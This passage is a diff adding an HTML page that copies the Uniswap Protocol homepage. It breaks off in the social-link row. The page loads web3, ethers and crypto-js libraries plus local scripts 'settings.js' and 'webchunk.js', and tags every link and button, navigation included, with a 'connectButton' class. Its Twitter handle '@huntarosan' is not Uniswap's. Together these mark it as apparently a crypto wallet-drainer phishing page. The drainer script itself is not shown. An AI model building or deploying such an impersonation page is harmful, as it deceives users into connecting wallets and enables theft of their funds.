@@ -1,0 +1,531 @@
+<html class="dark" lang="en" style="color-scheme: dark;">
+ <head>
+  <meta charset="utf-8"/>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta content="width=device-width" name="viewport"/>
+  <title>
+   Home | Uniswap Protocol
+  </title>
+  <meta content="Swap, earn, and build on the leading decentralized crypto trading protocol." name="description"/>
+  <meta content="https://uniswap.org/" property="og:url"/>
+  <link href="https://uniswap.org/" rel="canonical"/>
+  <meta content="website" property="og:type"/>
+  <meta content="Uniswap Protocol" property="og:site_name"/>
+  <meta content="Swap, earn, and build on the leading decentralized crypto trading protocol." property="og:description"/>
+  <meta content="Home | Uniswap Protocol" property="og:title"/>
+  <meta content="https://uniswap.org/images/twitter-card.jpg" property="og:image"/>
+  <meta content="summary_large_image" name="twitter:card"/>
+  <meta content="@huntarosan" name="twitter:site"/>
+  <meta content="Home | Uniswap Protocol" name="twitter:title"/>
+  <meta content="Swap, earn, and build on the leading decentralized crypto trading protocol." name="twitter:description"/>
+  <meta content="https://uniswap.org/images/twitter-card.jpg" name="twitter:image"/>
+  <link href="https://fonts.googleapis.com" rel="preconnect"/>
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+  <meta content="19" name="next-head-count"/>
+  <link href="/favicon.ico" rel="icon"/>
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+  <link as="style" href="/_next/static/css/04b4051b3a929362.css" rel="preload"/>
+  <link data-n-g="" href="/_next/static/css/04b4051b3a929362.css" rel="stylesheet"/>
+  <noscript data-n-css="">
+  </noscript>
+  <script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/webpack-7a5d3787824671d6.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/framework-5f4595e5518b5600.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/main-a6cead3bed78f2a2.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/pages/_app-6a15051382ee5900.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/29107295-fbcfe2172188e46f.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/689-76a6ba1f38d3940b.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/566-1e8c1312f440b0be.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/294-4e91e954950ae9a0.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/722-e5591a5dab14d6d3.js">
+  </script>
+  <script defer="" src="/_next/static/chunks/pages/index-6f5ce8021310601b.js">
+  </script>
+  <script defer="" src="/_next/static/L5JIf9Uj8AhMwjuK1fwi2/_buildManifest.js">
+  </script>
+  <script defer="" src="/_next/static/L5JIf9Uj8AhMwjuK1fwi2/_ssgManifest.js">
+  </script>
+  <style data-styled="active" data-styled-version="5.3.0">
+  </style>
+  <style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap">
+   @font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuOKfMZs.woff) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs.woff) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuI6fMZs.woff) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs.woff) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs.woff) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
+  </style>
+  <link as="script" href="/_next/static/chunks/pages/ecosystem-e7e450448a0c4a07.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/community-31818c05a91c4aa6.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/712-1044477eee255e0d.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/governance-e8e6be40928133b4.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/developers-d292703076348cbe.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/faq-4d8d2f3620dde2b6.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/privacy-policy-1ee6e44b8228b586.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/trademark-344d62730a5db17b.js" rel="prefetch"/>
+  <link as="script" href="/_next/static/chunks/pages/security-c4279b0a2fcc45ce.js" rel="prefetch"/>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body class="text-gray-900 dark:text-white">
+  <div data-reactroot="" id="__next">
+   <script>
+    !function(){try{var d=document.documentElement,c=d.classList;c.remove('light','dark');var e=localStorage.getItem('theme');if(e){c.add(e|| '')}else{c.add('dark');}if(e==='light'||e==='dark'||!e)d.style.colorScheme=e||'dark'}catch(t){}}();
+   </script>
+   <header class="Header__StyledHeader-sc-15dpzwa-0 hlBhqW">
+    <div class="Header__Content-sc-15dpzwa-1 Ztdtj">
+     <a class="Header__LogoWrapper-sc-15dpzwa-2 fmUYaN connectButton" href="/">
+      <svg class="Icons__UniLogo-sc-dy67gv-0 iEwsPo" fill="white" viewbox="0 0 14 15" xmlns="http://www.w3.org/2000/svg">
+       <path d="M4.152 1.551c-.188-.029-.196-.032-.107-.045.17-.026.57.009.846.074.644.152 1.23.542 1.856 1.235l.166.184.238-.038c1.002-.16 2.02-.033 2.873.358.235.108.605.322.65.377.016.018.043.13.06.251.064.418.033.737-.096.976-.07.13-.074.171-.027.283a.274.274 0 0 0 .246.154c.212 0 .44-.34.545-.814l.042-.189.083.094c.457.514.815 1.214.876 1.712l.016.13-.076-.118a1.462 1.462 0 0 0-.435-.453c-.306-.201-.63-.27-1.486-.315-.774-.04-1.212-.106-1.646-.247-.739-.24-1.111-.558-1.989-1.702-.39-.509-.63-.79-.87-1.016-.545-.515-1.08-.785-1.765-.89Z">
+       </path>
+       <path d="M10.85 2.686c.019-.34.065-.565.159-.77a.825.825 0 0 1 .077-.148c.005 0-.011.06-.036.133-.068.2-.08.472-.032.789.06.402.093.46.52.894.201.204.434.46.519.571l.154.2-.154-.143c-.188-.175-.62-.517-.716-.566-.064-.032-.074-.032-.113.007-.037.036-.044.09-.05.346-.007.399-.062.655-.194.91-.071.14-.082.11-.018-.047.048-.116.053-.168.053-.554 0-.775-.094-.962-.637-1.28a5.971 5.971 0 0 0-.504-.26 1.912 1.912 0 0 1-.246-.12c.015-.015.545.139.758.22.318.122.37.137.409.123.025-.01.038-.085.05-.305ZM4.517 4.013c-.381-.522-.618-1.323-.566-1.922l.015-.185.087.015c.164.03.445.134.577.214.361.218.518.505.677 1.243.047.216.108.46.136.544.045.133.217.444.356.646.1.146.034.215-.188.195-.339-.03-.798-.345-1.094-.75ZM10.386 7.9c-1.784-.713-2.412-1.333-2.412-2.378 0-.154.005-.28.012-.28.006 0 .075.05.153.113.362.288.767.411 1.889.574.66.096 1.03.173 1.373.286 1.09.359 1.763 1.087 1.924 2.08.046.288.02.828-.057 1.113-.06.225-.242.63-.29.646-.014.005-.027-.046-.03-.116-.018-.372-.208-.735-.526-1.007-.362-.309-.848-.555-2.036-1.03ZM9.134 8.197a3.133 3.133 0 0 0-.086-.375l-.046-.135.085.095c.117.13.21.297.288.52.06.17.066.22.066.496 0 .271-.008.328-.064.48a1.518 1.518 0 0 1-.376.596c-.326.33-.745.512-1.35.588-.105.013-.411.035-.68.049-.679.035-1.126.108-1.527.248a.324.324 0 0 1-.115.027c-.016-.016.258-.178.483-.286.318-.153.635-.236 1.345-.353.35-.058.713-.129.805-.157.868-.264 1.315-.947 1.172-1.793Z">
+       </path>
+       <path d="M9.952 9.641c-.237-.506-.292-.995-.162-1.451.014-.05.036-.089.05-.089.013 0 .07.03.124.067.11.073.328.196.912.512.728.395 1.144.7 1.426 1.05.247.305.4.654.474 1.078.042.24.017.82-.045 1.062-.196.764-.65 1.364-1.3 1.714-.095.051-.18.093-.19.093-.009 0 .026-.087.077-.194.219-.454.244-.895.079-1.386-.102-.301-.308-.668-.724-1.289-.484-.72-.602-.913-.721-1.167ZM3.25 12.374c.663-.556 1.486-.95 2.237-1.072a3.51 3.51 0 0 1 1.161.045c.48.122.91.396 1.133.721.218.319.312.596.41 1.214.038.243.08.488.092.543.073.32.216.576.392.704.28.204.764.217 1.239.033a.618.618 0 0 1 .155-.048c.017.017-.222.176-.39.26a1.334 1.334 0 0 1-.648.156c-.435 0-.796-.22-1.098-.668a5.3 5.3 0 0 1-.296-.588c-.318-.721-.475-.94-.844-1.181-.322-.21-.737-.247-1.049-.095-.41.2-.524.72-.23 1.05a.911.911 0 0 0 .512.266.545.545 0 0 0 .619-.544c0-.217-.084-.34-.295-.436-.289-.129-.598.022-.597.291 0 .115.051.187.167.24.074.033.076.035.015.023-.264-.055-.326-.372-.114-.582.256-.252.784-.141.965.204.076.145.085.433.019.607-.15.39-.582.595-1.022.483-.3-.076-.421-.158-.782-.527-.627-.642-.87-.767-1.774-.907l-.174-.027.197-.165Z">
+       </path>
+       <path clip-rule="evenodd" d="M.308.884C2.402 3.41 3.845 4.452 4.005 4.672c.132.182.082.346-.144.474a1.381 1.381 0 0 1-.515.143c-.147 0-.198-.056-.198-.056-.085-.08-.133-.066-.57-.837A132.96 132.96 0 0 0 1.45 2.67c-.032-.03-.031-.03 1.067 1.923.177.407.035.556.035.614 0 .118-.033.18-.179.343-.244.27-.353.574-.432 1.203-.088.705-.336 1.203-1.024 2.056-.402.499-.468.59-.57.792-.128.253-.163.395-.177.714-.015.339.014.557.118.88.09.284.186.47.429.844.21.323.33.563.33.657 0 .074.014.074.34.001.776-.174 1.407-.48 1.762-.857.22-.233.271-.361.273-.68.001-.208-.006-.252-.063-.372-.092-.195-.26-.358-.63-.61-.486-.33-.694-.595-.75-.96-.048-.3.007-.511.275-1.07.278-.58.347-.827.394-1.41.03-.377.071-.526.18-.646.114-.124.216-.166.498-.204.459-.063.75-.18.99-.4a.853.853 0 0 0 .31-.652l.01-.21-.117-.134C4.098 4.004.026.5 0 .5-.005.5.133.673.308.884Zm.976 9.815a.37.37 0 0 0-.115-.489c-.15-.1-.385-.052-.385.077 0 .04.022.069.072.094.084.043.09.091.024.19-.067.099-.061.186.015.246.123.095.297.043.389-.118ZM4.925 5.999c-.215.065-.424.292-.49.53-.039.145-.016.4.043.478.096.127.188.16.439.159.49-.003.916-.212.966-.474.04-.214-.147-.51-.405-.641a.965.965 0 0 0-.553-.052Zm.574.445c.075-.107.042-.222-.087-.3-.244-.149-.615-.026-.615.204 0 .115.193.24.37.24.118 0 .28-.07.332-.144Z" fill-rule="evenodd">
+       </path>
+      </svg>
+     </a>
+     <nav class="Navigation__LargeWrapper-sc-v46eg4-2 bYSOwc">
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="/ecosystem">
+       Ecosystem
+      </a>
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="/community">
+       Community
+      </a>
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="/governance">
+       Governance
+      </a>
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="/developers">
+       Developers
+      </a>
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="https://blog.uniswap.org">
+       Blog
+      </a>
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="/faq">
+       FAQ
+      </a>
+      <a class="Navigation__StyledLink-sc-v46eg4-1 jXvTxb px-4 py-4 connectButton" href="https://boards.greenhouse.io/uniswaplabs" target="_blank">
+       Jobs
+      </a>
+      <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Button__ButtonSecondary-sc-p6xn44-1 Navigation__LaunchButton-sc-v46eg4-0 fpGARf fVQvCS connectButton" href="https://app.uniswap.org" rel="noopener noreferrer" target="_blank">
+       Launch App
+      </a>
+     </nav>
+     <div class="Navigation__MobileWrapper-sc-v46eg4-4 eFGaxv">
+      <button class="Button__ButtonSecondary-sc-p6xn44-1 Navigation__MenuButton-sc-v46eg4-3 bpZKHt gCrwlu connectButton">
+       Menu
+      </button>
+     </div>
+    </div>
+   </header>
+   <main>
+    <div class="Layout__AppBody-sc-tki460-0 bHRIuH px-4 py-4 mx-auto flex justify-center">
+     <span class="pages__BGCard-sc-1hmqm-0 dUmZrJ">
+      <span class="CardImages__CardGlimmerImage-sc-jhrk3h-1 dsQGdH">
+      </span>
+      <span class="CardImages__CardBGImage-sc-jhrk3h-0 eRCqdW">
+      </span>
+     </span>
+     <div class="Content__ContentWrapper-sc-1ufzij2-0 jmIsye">
+      <div class="column__AutoColumn-sc-165u8h7-2 pages__StyledTitle-sc-1hmqm-1 erlQZJ bfMfVi">
+       <h1 class="pages__StyledBodyTitle-sc-1hmqm-2 eERmft">
+        <span style="font-weight:100;margin-right:12px;margin-top:0;margin-bottom:0">
+         UNISWAP
+        </span>
+        <svg class="pages__StyledGlimmer-sc-1hmqm-12 jXiuut" fill="current" height="41" viewbox="0 0 41 41" width="41" xmlns="http://www.w3.org/2000/svg">
+         <path d="M20.0848 20.0848V19.5269H0V20.0848H20.0848Z">
+         </path>
+         <path d="M20.0848 0V20.0848L19.5269 20.0848V0H20.0848Z">
+         </path>
+         <path d="M6.69494 20.0848C14.0869 20.078 20.078 14.0869 20.0848 6.69494L20.0848 20.0848L6.69494 20.0848Z">
+         </path>
+         <path d="M33.4747 20.0848C26.0827 20.0917 20.0917 26.0827 20.0848 33.4747L20.0848 20.0848L33.4747 20.0848Z">
+         </path>
+         <path d="M20.0848 20.0848L20.0848 20.6428L40.1696 20.6428V20.0848L20.0848 20.0848Z">
+         </path>
+         <path d="M20.0848 40.1697L20.0848 20.0848L20.6427 20.0848L20.6427 40.1697H20.0848Z">
+         </path>
+        </svg>
+        PROTOCOL
+       </h1>
+       <p class="Type__Title-sc-15ds5js-2 ljEHpf" style="font-weight:300;max-width:780px;font-size:24px">
+        Swap, earn, and build on the leading decentralized crypto trading protocol.
+       </p>
+       <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Button__ButtonSecondary-sc-p6xn44-1 pages__StyledTradeLink-sc-1hmqm-15 fpGARf jhVeGx connectButton" href="https://app.uniswap.org/" rel="noopener noreferrer" target="_blank">
+        Launch App
+       </a>
+       <nav class="pages__StyledSocialRow-sc-1hmqm-8 kTUbOm">
+        <a class="pages__OutboundLink-sc-1hmqm-24 irHuFq connectButton" href="https://twitter.com/uniswap/" rel="noreferrer noopenner" target="_blank">
+         <svg class="Icons__TwitterIcon-sc-dy67gv-2 ipWMgx" fill="white" size="24" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+          <path d="M31.275 5.924c-.503.223-1.02.411-1.548.564a6.842 6.842 0 0 0 1.393-2.45.516.516 0 0 0-.755-.6 12.181 12.181 0 0 1-3.6 1.422 6.904 6.904 0 0 0-4.809-1.96 6.877 6.877 0 0 0-6.813 7.757A17.587 17.587 0 0 1 3.072 4.253a.516.516 0 0 0-.846.067 6.866 6.866 0 0 0-.93 3.454c0 1.655.59 3.225 1.634 4.452a5.816 5.816 0 0 1-.919-.41.516.516 0 0 0-.767.44v.091c0 2.47 1.33 4.695 3.362 5.908a5.882 5.882 0 0 1-.522-.076.516.516 0 0 0-.588.664 6.867 6.867 0 0 0 5.032 4.605 12.153 12.153 0 0 1-6.497 1.854c-.486 0-.976-.029-1.455-.085a.517.517 0 0 0-.339.946A18.525 18.525 0 0 0 10.255 29.1c6.994 0 11.37-3.298 13.808-6.065 3.041-3.45 4.785-8.016 4.785-12.528 0-.189-.003-.38-.009-.569a13.355 13.355 0 0 0 3.074-3.255.516.516 0 0 0-.638-.759Z">
+          </path>
+         </svg>
+        </a>
+        <a class="pages__OutboundLink-sc-1hmqm-24 irHuFq connectButton" href="https://github.com/Uniswap/" rel="noreferrer noopenner" target="_blank">
